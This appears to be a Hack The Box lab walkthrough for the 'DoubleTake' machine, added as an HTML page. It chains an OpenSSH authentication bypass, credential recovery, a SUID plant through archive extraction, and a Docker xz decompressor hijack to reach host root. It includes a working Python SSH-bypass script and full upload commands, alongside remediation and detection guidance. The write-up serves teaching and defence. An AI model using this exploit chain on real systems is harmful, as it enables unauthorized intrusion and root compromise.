@@ -1,0 +1,116 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>DoubleTake walkthrough — d4rkgunn3r</title><meta name="description" content="DoubleTake: OpenSSH authentication bypass, container credential discovery, privileged archive extraction, and Docker host-root validation."><link rel="stylesheet" href="/HackTheBox-Walkthroughs/style.css"><script src="/HackTheBox-Walkthroughs/site.js" defer></script><style>aside a{line-height:1.5;margin-top:14px}article{min-width:0}article code{overflow-wrap:anywhere}pre code{overflow-wrap:normal}article strong{color:var(--text)}article a{color:var(--accent)}.table-scroll{overflow-x:auto}table{border-collapse:collapse;width:100%;font-size:13px;line-height:1.7}th,td{text-align:left;padding:12px;border:1px solid var(--line);vertical-align:top}th{color:var(--accent);background:var(--panel)}article section{margin-top:40px}pre{line-height:1.7}aside{max-height:90vh;overflow-y:auto}@media print{header,aside,footer,.articlebottom{display:none}.articlewrap{display:block}.site{--bg:white;--text:black;--muted:#333;--line:#bbb;--panel:#eee;--accent:#245000}pre{white-space:pre-wrap;color:black;background:#eee}article h1{font-size:40px}}</style></head><body><div class="site"><header><a class="brand" href="/HackTheBox-Walkthroughs/">d4rk<span>gunn3r</span><b> / field notes</b></a><nav><a href="/HackTheBox-Walkthroughs/#archive">← All writeups</a><button aria-label="Toggle color theme">◑</button></nav></header><main class="articlewrap"><aside><div class="eyebrow">ON THIS PAGE</div><a href="#summary"><small>01</small>Assessment summary</a><a href="#recon"><small>02</small>Preparation and reconnaissance</a><a href="#web"><small>03</small>Map the web authentication boundary</a><a href="#ssh"><small>04</small>Initial access through OpenSSH</a><a href="#credentials"><small>05</small>Recover and validate the panel credential</a><a href="#deploy"><small>06</small>Inspect the deployment trust boundary</a><a href="#container"><small>07</small>Establish container root</a><a href="#host"><small>08</small>Cross into the Docker host</a><a href="#cleanup"><small>09</small>Cleanup and residual state</a><a href="#defense"><small>10</small>Remediation and detection</a><a href="#evidence"><small>11</small>Evidence and reproduction limits</a><a href="#references"><small>12</small>Primary references</a></aside><article><div class="eyebrow">HACK THE BOX / LINUX / WALKTHROUGH</div><h1>DoubleTake</h1><p class="lede">From an OpenSSH authentication bypass to Docker host root.</p><p class="byline">Dylan Senez · d4rkgunn3r · Assessment November 13–14, 2026 · Edited November 16, 2026</p><div class="notice"><strong>Source and reproduction</strong><p>My authorized HTB lab assessment, edited for the web. Results below are retained evidence, not a new retest. Captured secrets and proof values are removed. Missing custom source files are identified where needed; this page does not claim a complete standalone replay.</p></div><section aria-labelledby="summary"><h2 id="summary">01 / Assessment summary</h2><p>DoubleTake started with two exposed services: SSH and an HTTP Basic-authenticated Zentara panel. I obtained command execution as <code>alpine</code> inside the workspace container, recovered a panel credential, and used the deployment feature to write root-owned files into that container. A vulnerable Docker archive-decompression path then executed a replacement <code>xz</code> binary with host privileges.</p><p>The retained assessment records reads of the host user proof, root proof, and protected host files. Container root and host root are separate milestones: <code>euid=0</code> in the workspace establishes the first; host process visibility and access through <code>/proc/1/root</code> support the second. Persistence, host modification beyond the probe workflow, and access to other containers were not tested.</p><div class="path">OpenSSH musl authentication bypass → alpine container shell → saved panel credential → privileged archive extraction → container root → Docker decompressor hijack → host root</div><p>Assessment: November 13–14, 2026 UTC. Final instance: <code>10.129.104.66</code>; earlier scans used <code>10.129.248.123</code>. Tools recorded: Nmap 7.99, Python 3.12 / Paramiko 5.0.0, curl, and Go 1.24.2. Addresses identify the original lab instances; substitute your assigned target.</p></section><section aria-labelledby="recon"><h2 id="recon">02 / Preparation and reconnaissance</h2><p>I used a single working directory to keep scans, scripts, and evidence together. Commands in this section run on the attack workstation.</p><pre><code>mkdir -p ~/doubletake/{evidence,loot,work}
+cd ~/doubletake
+export TARGET=10.129.104.66
+nmap -p- --min-rate 3000 -T4 -Pn -n -oN loot/01_allports.txt &quot;$TARGET&quot;
+nmap -sCV -p22,80 -Pn -n -oN loot/02_services.txt &quot;$TARGET&quot;</code></pre><p><strong>Recorded result · E01 · PDF pp. 6–7</strong></p><pre><code>22/tcp open ssh  OpenSSH 10.6 (protocol 2.0)
+80/tcp open http nginx 1.24.0 (Ubuntu)
+HTTP/1.1 401 UNAUTHORIZED
+WWW-Authenticate: Basic realm=&quot;Zentara&quot;</code></pre><p>The SSH banner was a research lead, not proof of vulnerability. The relevant conditions are a musl-based SSH server without PAM, password authentication enabled, and the affected account/password-hash arrangement. I only confirmed the container OS after obtaining execution. The final SSH banner matched the earlier scan.</p></section><section aria-labelledby="web"><h2 id="web">03 / Map the web authentication boundary</h2><pre><code>curl -sI &quot;http://$TARGET/&quot;
+for path in /files /files/ /agents/create /static/style.css /deploy /settings; do
+  printf &#x27;%-20s &#x27; &quot;$path&quot;
+  curl -s -o /dev/null -w &#x27;%{http_code}\n&#x27; &quot;http://$TARGET$path&quot;
+done
+curl -s &quot;http://$TARGET/files/&quot; | head -5</code></pre><p><strong>Recorded result · E02 · PDF pp. 8–9</strong></p><pre><code>/                  401  empty response body
+/files             401
+/files/            404  Flask-style error page
+/static/style.css  200
+/agents/create     405  recorded on the earlier instance</code></pre><p>The responses suggested inconsistent coverage between nginx and the application. They did not demonstrate access to protected panel data. Public CSS can be intentional; a framework error page alone is a limited observation. Also, a different HTTP method does not itself select a different nginx location. The PDF’s stronger authentication-bypass claims have been narrowed to the observed route behavior. The successful attack path below used a recovered credential.</p></section><section aria-labelledby="ssh"><h2 id="ssh">04 / Initial access through OpenSSH</h2><p>The single oversized-password control failed. A short rejected attempt followed by a 300-byte password on the same SSH transport authenticated <code>alpine</code>. Keeping the transport open was material to the recorded result.</p><p><strong>Recorded result · E03 · PDF pp. 10–13</strong></p><pre><code>[FAIL] alpine: AUTH_FAIL: Authentication failed.
+[OK] alpine: uid=1000(alpine) gid=1000(alpine) groups=1000(alpine)
+7f906e0ee8ec
+3.22.8</code></pre><p>This behavior is consistent with CVE-2026-123158. Alpine’s advisory describes the affected password fields and musl/no-PAM conditions. An Alpine release number alone is insufficient: distribution packages may contain backported fixes, and the running daemon must be restarted after upgrading. The transcript reports Alpine 3.22.8 alongside OpenSSH 10.6; it does not include a complete package provenance record.</p><p>Save the following as <code>work/sshole_run.py</code>. This is an editorially repaired, single-user form of the PDF’s Paramiko runner: the appendix omitted the command-line dispatch and its fixed sleep could truncate output. The revised listing waits for channel output and exit status. It has been syntax checked, not rerun against the machine.</p><pre><code>import sys
+import paramiko
+
+host = sys.argv[1]
+command = sys.argv[2] if len(sys.argv) &gt; 2 else &quot;id; hostname&quot;
+transport = paramiko.Transport((host, 22))
+transport.banner_timeout = 25
+try:
+    transport.start_client(timeout=25)
+    try:
+        transport.auth_password(&quot;alpine&quot;, &quot;not-the-password&quot;)
+    except paramiko.AuthenticationException:
+        pass
+    transport.auth_password(&quot;alpine&quot;, &quot;A&quot; * 300)
+    with transport.open_session(timeout=25) as channel:
+        channel.set_combine_stderr(True)
+        channel.settimeout(30)
+        channel.exec_command(command)
+        while True:
+            data = channel.recv(8192)
+            if not data:
+                break
+            sys.stdout.buffer.write(data)
+            sys.stdout.buffer.flush()
+        status = channel.recv_exit_status()
+finally:
+    transport.close()
+sys.exit(status)</code></pre><pre><code>python3 -m venv .venv
+. .venv/bin/activate
+python3 -m pip install paramiko
+python3 work/sshole_run.py &quot;$TARGET&quot; &#x27;id; hostname; cat /etc/alpine-release&#x27;</code></pre><p>For later container commands, pass the command string to this runner from the attack workstation. Each invocation establishes a fresh transport and repeats the two attempts. Authentication failure is not a reason to assume every account is vulnerable: verify the server build and account conditions.</p></section><section aria-labelledby="credentials"><h2 id="credentials">05 / Recover and validate the panel credential</h2><p>Inside the container, the <code>alpine</code> profile contained a saved Zentara login.</p><pre><code>python3 work/sshole_run.py &quot;$TARGET&quot; \
+  &#x27;cat /home/alpine/.mozilla/firefox/zentara.default/logins.json&#x27;</code></pre><p><strong>Recorded result · E04 · PDF pp. 14–15</strong></p><pre><code>hostname: http://172.17.0.1
+httpRealm: Zentara
+encType: 0
+username: bob
+password: [REDACTED IN PUBLIC COPY]</code></pre><p>The supplied lab JSON contained fields whose values decoded directly with base64. This is a property of this example, not normal Firefox password encryption: real saved-login records generally require NSS key material. The profile directory was owned by <code>alpine</code> with mode <code>0700</code>; the evidence supports access by the compromised owner, not a world-readable profile or proven password reuse across services.</p><p>Decode the two fields locally from the retrieved JSON, then validate the recovered password. This command prompts for it without putting the value in shell history:</p><pre><code>curl -s -u bob -o /dev/null -w &#x27;%{http_code}\n&#x27; &quot;http://$TARGET/&quot;</code></pre><p>The recorded response was <code>200</code>. Use <code>curl -u bob</code> for subsequent authenticated requests and enter the recovered lab password when prompted. No captured password or encoded equivalent is embedded in this public version.</p></section><section aria-labelledby="deploy"><h2 id="deploy">06 / Inspect the deployment trust boundary</h2><pre><code>curl -s -u bob &quot;http://$TARGET/status&quot;
+curl -s -u bob &quot;http://$TARGET/docs&quot;
+curl -s -u bob &quot;http://$TARGET/deploy&quot;</code></pre><p><strong>Recorded result · E05 · PDF pp. 16–17</strong></p><pre><code>Engine: Docker 29.5.0
+API Version: 1.54
+OS / Arch: linux/amd64
+Workspace Container: zentara-alpine
+Supported archives: .tar, .tar.gz, .tar.xz
+Documented backend: PUT /containers/&lt;container_name&gt;/archive</code></pre><p>The application accepted an archive plus a caller-selected <code>workspace</code> destination. The record includes a successful upload targeting <code>/etc/ssh</code> and history containing <code>/workspace/../etc</code>. A receipt alone does not prove the resulting filesystem state; later ownership and execution checks establish the privileged write.</p><p>For a harmless first check in an assigned instance, build a text archive and deploy it to a temporary directory, then inspect the result from the container. These setup commands are editorial additions; the original baseline used a pre-existing <code>banner_test.tar.gz</code> whose construction was not shown.</p><pre><code>mkdir -p work/check
+printf &#x27;deployment check\n&#x27; &gt; work/check/check.txt
+tar -cf work/check.tar -C work/check check.txt
+curl -s -u bob -F &#x27;archive=@work/check.tar&#x27; \
+  -F &#x27;workspace=/tmp&#x27; &quot;http://$TARGET/deploy&quot;
+python3 work/sshole_run.py &quot;$TARGET&quot; &#x27;ls -l /tmp/check.txt; cat /tmp/check.txt&#x27;</code></pre><p>The security issue is exposing privileged, caller-directed extraction through a network-facing application. The Docker archive API is an administrative interface; preserving metadata is not by itself a separate Docker vulnerability.</p></section><section aria-labelledby="container"><h2 id="container">07 / Establish container root</h2><p>The recorded escalation used a statically linked Go helper, packaged with mode <code>4755</code>. The panel’s extraction created a root-owned SUID executable under <code>/workspace</code>. Run the build and upload commands on the workstation; the final checks execute in the container.</p><pre><code># Requires the original rootcmd.go source (not included in the PDF).
+cd ~/doubletake/work/suid
+CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o rootcmd rootcmd.go
+chmod 4755 rootcmd
+tar --owner=0 --group=0 -czf ~/doubletake/loot/rootcmd.tar.gz rootcmd
+cd ~/doubletake
+curl -s -u bob -F &quot;archive=@$HOME/doubletake/loot/rootcmd.tar.gz&quot; \
+  -F &#x27;workspace=/workspace&#x27; &quot;http://$TARGET/deploy&quot;
+python3 work/sshole_run.py &quot;$TARGET&quot; \
+  &#x27;ls -la /workspace/rootcmd; /workspace/rootcmd idroot&#x27;</code></pre><p><strong>Recorded result · E06 · PDF pp. 18–19</strong></p><pre><code>-rwsr-xr-x root/root 5865634 rootcmd
+uid=1000 euid=0 gid=1000 egid=1000</code></pre><p>The effective UID establishes root execution inside the container while the real UID remains 1000. It does not establish host root. The retained record also shows access to the container shadow file; password hashes are omitted here.</p><p><strong>Reproduction dependency:</strong> the PDF names <code>work/suid/rootcmd.go</code> and its supported modes but does not include that source. The commands above preserve the recorded sequence and explicitly require that artifact. An unrelated replacement helper would be a new implementation, not the original evidence. A <code>nosuid</code> mount prevents SUID elevation even if the mode bit is visible; it does not necessarily cause an execution-denied error.</p></section><section aria-labelledby="host"><h2 id="host">08 / Cross into the Docker host</h2><p>The decisive primitive was CVE-2026-41567: affected Docker archive extraction could resolve an external decompressor from the container filesystem and execute it with daemon privileges. This is a container-to-host trust-boundary crossing without a kernel exploit. The upstream advisory identifies Docker Engine 29.5.1 as the fixed release.</p><p>The record uses <code>xz</code> because it was present. Its original hash was captured and the binary preserved before replacement. Standard Docker CLI copy behavior sends uncompressed tar by default; the vulnerable path requires explicitly compressed input and an external helper.</p><pre><code># Execute inside the container before replacement:
+ls -la /usr/bin/xz
+sha256sum /usr/bin/xz
+cp -p /usr/bin/xz /tmp/orig_xz</code></pre><p>On the workstation, the original Go probe was compiled statically and packaged as <code>usr/bin/xz</code>. It wrote privilege-context markers and handed decompression to the saved genuine binary. The full <code>xzprobe*.go</code> implementations are not present in the PDF, so this is a documented artifact dependency.</p><pre><code># Requires the original work/xz/xzprobe.go and follow-on probe sources.
+cd ~/doubletake/work/xz
+CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o xz xzprobe.go
+mkdir -p pkg/usr/bin
+cp xz pkg/usr/bin/xz
+chmod 755 pkg/usr/bin/xz
+tar --owner=0 --group=0 -cf xzprobe.tar -C pkg usr/bin/xz
+curl -s -u bob -F &#x27;archive=@xzprobe.tar&#x27; \
+  -F &#x27;workspace=/&#x27; &quot;http://$TARGET/deploy&quot;
+
+# Build the trigger with the workstation&#x27;s genuine xz binary.
+mkdir -p trig
+printf &#x27;trigger\n&#x27; &gt; trig/trigger.txt
+tar -cf trig/trigger.tar -C trig trigger.txt
+xz -k -f trig/trigger.tar
+curl -s -u bob -F &#x27;archive=@trig/trigger.tar.xz&#x27; \
+  -F &#x27;workspace=/tmp&#x27; &quot;http://$TARGET/deploy&quot;</code></pre><p><strong>Recorded result · E07 · PDF pp. 21–22</strong></p><pre><code>=== xz decompressor hijack probe ===
+time=2026-11-14T16:41:54Z
+argv=[&quot;xz&quot; &quot;-d&quot; &quot;-c&quot; &quot;-q&quot;]
+uid=0 euid=0 gid=0 egid=0
+hostname=doubletake
+CapEff: 000001ffffffffff
+NoNewPrivs: 0
+Seccomp: 0</code></pre><p>An upload success message is not execution proof. The marker, effective capabilities, and host hostname supported a host-context hypothesis; UID 0 or hostname alone would be insufficient. The later probe mounted procfs and demonstrated host process and filesystem visibility.</p><p><strong>Recorded result · E08 · PDF pp. 23–24</strong></p><pre><code>time=2026-11-14T16:42:30Z
+uid=0 euid=0
+procfs mounted at /proc: OK
+host pid count visible=279
+pid1_cmdline=/sbin/init
+host hostname=doubletake
+/proc/1/root/root/root.txt: [PROOF VALUE REDACTED]
+/proc/1/root/home/bob/user.txt: [PROOF VALUE REDACTED]</code></pre><p>Together these observations support host-root code execution and protected host-file reads. The PDF includes snippets for mounting procfs and reading <code>/proc/1/root</code>, but not the complete follow-on probe. This publication does not claim the excerpts alone form a complete runnable exploit or that a separate interactive host shell was obtained.</p></section><section aria-labelledby="cleanup"><h2 id="cleanup">09 / Cleanup and residual state</h2><p>The assessment used additional deployment payloads to remove probes and restore the genuine <code>xz</code>. The final check matched the pre-test hash and reported the original workspace directories. The cleanup source files and archives are referenced but not included in the supplied PDF; do not attempt restoration using nonexistent archives.</p><p><strong>Recorded result · E09 · PDF pp. 26–27</strong></p><pre><code>/usr/bin/xz SHA-256:
+39a97b2cabdfca71a9ebc089be4ea4c2ee08ef59300289b972de05c034b3e417
+xz (XZ Utils) 5.8.4
+/workspace: api-service, db, docs
+/tmp and /dev/shm: reported empty
+proc mount entries at /proc: 0
+removed /tmp/trigger.txt</code></pre><p>Deployment-history records remained because the application exposed no deletion action. The record does not prove that all forensic artifacts disappeared: application and system logs, audit telemetry, and filesystem traces may remain. No API-token rotation was recorded; the displayed token was already expired. For a repeat lab run without the original cleanup artifacts, preserve evidence and reset the assigned instance rather than improvising a replacement of a critical binary.</p></section><section aria-labelledby="defense"><h2 id="defense">10 / Remediation and detection</h2><p>Break the chain at several independent boundaries: patch the actual running OpenSSH package and restart sshd; upgrade Docker Engine to a fixed supported release; remove network-facing access to privileged archive APIs; and extract uploads as an unprivileged worker into a fixed directory while validating paths, symlinks, ownership, and modes. Keep browser profiles and administrative credentials out of workspace images.</p><p>Apply authentication consistently to intended private routes and verify the application enforces authorization itself. Treat the expired token display as a hygiene observation: the record does not establish valid token use, a functioning external integration, or a complete absence of backend revocation. A standalone exploitable-token finding is not supported.</p><div class="table-scroll"><table><thead><tr><th>Behavior</th><th>Useful telemetry</th></tr></thead><tbody><tr><td>Failed then accepted password for a key-only account</td><td>Correlated sshd authentication records and account configuration</td></tr><tr><td>Deploy destination outside the intended workspace</td><td>Application request/audit records; ordinary access logs may omit multipart fields</td></tr><tr><td>Root-owned SUID file created in a workspace</td><td>File-integrity and execution telemetry</td></tr><tr><td>Container decompressor replaced and executed by the daemon</td><td>Host process ancestry, executable identity, namespace context, overlay file changes</td></tr><tr><td>Browser credential file read by a non-browser process</td><td>File-access auditing on the relevant profile</td></tr></tbody></table></div><p>These are investigation leads, not deployed or tested detection rules. Standard SSH logs do not expose plaintext password lengths, so “password longer than 256 bytes” is not a reliable ordinary-log detection.</p></section><section aria-labelledby="evidence"><h2 id="evidence">11 / Evidence and reproduction limits</h2><p>This page was edited from <em>DoubleTake_Walkthrough(1).pdf</em>, 43 pages. Evidence IDs above point to the supplied report pages; original raw logs were not independently supplied or re-executed for this publication. The code examples are text, not reconstructed screenshots.</p><ul><li><strong>Included:</strong> scan and route checks, an explicitly revised SSH runner, panel queries, archive/upload sequence, recorded container/host results, and cleanup verification excerpts.</li><li><strong>Still required for complete replay:</strong> original <code>rootcmd.go</code>, <code>xzprobe.go</code>, <code>xzprobe2.go</code>, <code>xzprobe3.go</code>, and cleanup/restoration source or archives. The PDF names these artifacts but does not provide full listings.</li><li><strong>Redacted:</strong> instance proof values, passwords, encoded password equivalents, shadow hashes, and token identifiers. Recover the lab credential from your own assigned instance.</li><li><strong>Corrected:</strong> Firefox encryption generalization, route/method overclaims, container versus host impact, unsupported expired-token severity, and claims of trace-free cleanup. No new CVSS scores or screenshots have been invented.</li></ul></section><section aria-labelledby="references"><h2 id="references">12 / Primary references</h2><p>The following advisories support the vulnerability conditions and fixes, not the independent validity of my lab transcript.</p><ul><li><a href="https://alpinelinux.org/posts/2026-11-05-openssh-password-authentication-bypass/">Alpine: OpenSSH password-authentication bypass and package fixes</a></li><li><a href="https://github.com/moby/moby/security/advisories/GHSA-x86f-5xw2-fm2r">Moby: compressed archive extraction executes a container binary on the host</a></li></ul></section><div class="articlebottom"><a href="/HackTheBox-Walkthroughs/#archive">← Back to archive</a><a href="#">Back to top ↑</a></div></article></main><footer><span>d4rkgunn3r / security field notes</span><span>Authorized lab · Original assessment</span></footer></div></body></html>
